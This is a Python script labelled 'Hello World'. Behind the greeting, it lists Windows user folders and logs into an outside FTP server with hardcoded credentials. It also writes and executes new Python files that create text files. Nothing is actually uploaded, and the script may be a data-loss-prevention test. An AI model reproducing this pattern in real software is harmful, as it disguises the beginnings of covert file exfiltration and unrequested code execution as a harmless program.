# ---------------------------------------
# HELLO WORLD!
# ---------------------------------------
# ---------------------------------------
# a_1, a_2, a_3, a_4, a_5, a_6, a_7, a_8, a_9 = "H", "E", "L", "O", " ", "W", "R", "D", "!"
# print("{}{}{}{}{}{}{}{}{}{}{}{}".format(a_1, a_2, a_3, a_3, a_4, a_5, a_6, a_4, a_7, a_3, a_8, a_9))
# ---------------------------------------
# letters = ["H","e","l","o","W","r","d","!", " "]
# print(letters[0],letters[1],letters[2],letters[2],letters[3],letters[8],letters[4],letters[3],letters[5],letters[2],letters[6],letters[7])
# ---------------------------------------
import os
import os.path
import random
import ftplib
# ---------------------------------------
path_01 = "c:\\"
path_02 = "c:\\Users\\%USERPROFILE%\\Documents"
path_03 = "c:\\Users\\%USERPROFILE%\\Desktop"
path_04 = "c:\\Users\\%USERPROFILE%\\Music"
path_05 = "c:\\Users\\%USERPROFILE%\\Pictures"
path_06 = "c:\\Users\\%USERPROFILE%\\Downloads"
path_07 = "c:\\Users\\%USERPROFILE%\\Links"
path_08 = "c:\\Users\\%USERPROFILE%\\Videos"
path_09 = "c:\\Users\\%USERPROFILE%\\3D Objects"
path_10 = "c:\\Users\\%USERPROFILE%\\Contacts"
path_11 = "c:\\Users\\%USERPROFILE%\\Saved Games"
path_12 = "c:\\Users\\%USERPROFILE%\\Searches"
path_13 = "c:\\Users\\%USERPROFILE%\\Favorites"
# ---------------------------------------
host = "ftp.dlptest.com"
username = "dlpuser@dlptest.com"
password = "rNrKYTX9g7z3RgJRmxWuGHbeu"
# ---------------------------------------
ftp_01 = ftplib.FTP(host, username, password)
ftp_01.encoding = "utf-8"
# ---------------------------------------
a = 0
# ---------------------------------------
while (a < 2):
  a += 1
  a_1, a_2, a_3, a_4, a_5, a_6, a_7, a_8, a_9 = "H", "E", "L", "O", " ", "W", "R", "D", "!"
  hellno = ("{}{}{}{}{}{}{}{}{}{}{}{}".format(a_1, a_2, a_3, a_3, a_4, a_5, a_6, a_4, a_7, a_3, a_8, a_9))
  a_string = str(a)
  ran_a = random.randint(0,999999999999)
  a_ran = str(ran_a)
  why = str("ohnoes"+ a_string +".py")
  runme = ("python3 " + why) 
  curse = open(why, "x")
# ---------------------------------------
  curse.write('''
import random
a = 0
while (a < 1):
 a += 1
 a_1, a_2, a_3, a_4, a_5, a_6, a_7, a_8, a_9 = "H", "E", "L", "O", " ", "W", "R", "D", "!"
 hellno = ("{}{}{}{}{}{}{}{}{}{}{}{}".format(a_1, a_2, a_3, a_3, a_4, a_5, a_6, a_4, a_7, a_3, a_8, a_9))
 b_string = str(a) + str(a)
 ran_b = random.randint(0,999999999999)
 b_ran = str(ran_b)
 why = str(b_ran + b_string + "ohyes.txt")
 curse = open(why, "x")
 curse.write("HELLO WORLD!")
 curse.close()
  ''')
# ---------------------------------------
  letters = ["H","e","l","o","W","r","d","!", " "]; print(letters[0],letters[1],letters[2],letters[2],letters[3],letters[8],letters[4],letters[3],letters[5],letters[2],letters[6],letters[7])
  curse.close()
  os.system(runme)
# ---------------------------------------
  
# ---------------------------------------
